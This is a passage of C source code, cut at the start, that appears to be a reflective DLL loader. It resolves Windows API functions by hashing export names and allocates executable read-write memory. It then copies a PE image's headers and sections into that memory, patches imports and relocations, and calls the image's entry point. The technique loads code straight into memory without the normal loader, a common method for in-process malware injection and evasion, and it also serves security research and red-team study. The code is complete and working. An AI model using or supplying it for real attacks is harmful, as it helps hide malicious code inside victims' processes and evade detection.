			uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

			// get the VA for the array of name pointers
			uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);

			// get the VA for the array of name ordinals
			uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals);

			usCounter = 1;

			// loop while we still have imports to find
			while (usCounter > 0)
			{
				// compute the hash values for this function name
				//dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
				char* p1 = (char *)(uiBaseAddress + DEREF_32(uiNameArray));
				DWORD dwHashValue = 0;
				do
				{
					dwHashValue = ROR(dwHashValue);
					dwHashValue += *p1;
				} while (*++p1);
				// if we have found a function we want we get its virtual address
				if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
				{
					// get the VA for the array of addresses
					uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

					// store this functions VA
					if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
						pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uiBaseAddress + DEREF_32(uiAddressArray));

					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}

		// we stop searching when we have found everything we need.
		if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache)
			break;

		// get the next entry
		uiValueA = DEREF(uiValueA);
	}

	// STEP 2: load our image into a new permanent location in memory...

	// get the VA of the NT Header for the PE to be loaded
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// we must now copy over the headers
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;

	while (uiValueA--)
		*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

	// STEP 3: load in all of our sections...

	// uiValueA = the VA of the first section
	uiValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

	// itterate through all sections, loading them into memory.
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while (uiValueE--)
	{
		// uiValueB is the VA for this section
		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

		// uiValueC if the VA for this sections data
		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);

		// copy the section over
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

		while (uiValueD--)
			*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

		// get the VA of the next section
		uiValueA += sizeof(IMAGE_SECTION_HEADER);
	}

	// STEP 4: process our images import table...

	// uiValueB = the address of the import directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

	// itterate through all imports
	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
	{
		// use LoadLibraryA to load the imported module into memory
		uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));

		// uiValueD = VA of the OriginalFirstThunk
		uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);

		// itterate through all imported functions, importing by ordinal if no name present
		while (DEREF(uiValueA))
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// get the VA of the modules NT Header
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				// get the VA of the export directory
				uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

				// get the VA for the array of addresses
				uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

				// patch in the address for this imported function
				DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
			}
			else
			{
				// get the VA of this functions import by name struct
				uiValueB = (uiBaseAddress + DEREF(uiValueA));

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
			}
			// get the next imported function
			uiValueA += sizeof(ULONG_PTR);
			if (uiValueD)
				uiValueD += sizeof(ULONG_PTR);
		}

		// get the next import
		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}

	// STEP 5: process all of our images relocations...

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// check if their are any relocations present
	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

		// and we itterate through all entries...
		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
		{
			// uiValueA = the VA for this relocation block
			uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

			// uiValueB = number of entries in this relocation block
			uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while (uiValueB--)
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
					*(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
					*(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

				// get the next entry in the current relocation block
				uiValueD += sizeof(IMAGE_RELOC);
			}

			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}
	// STEP 6: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
	((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL);
	return 0;
}
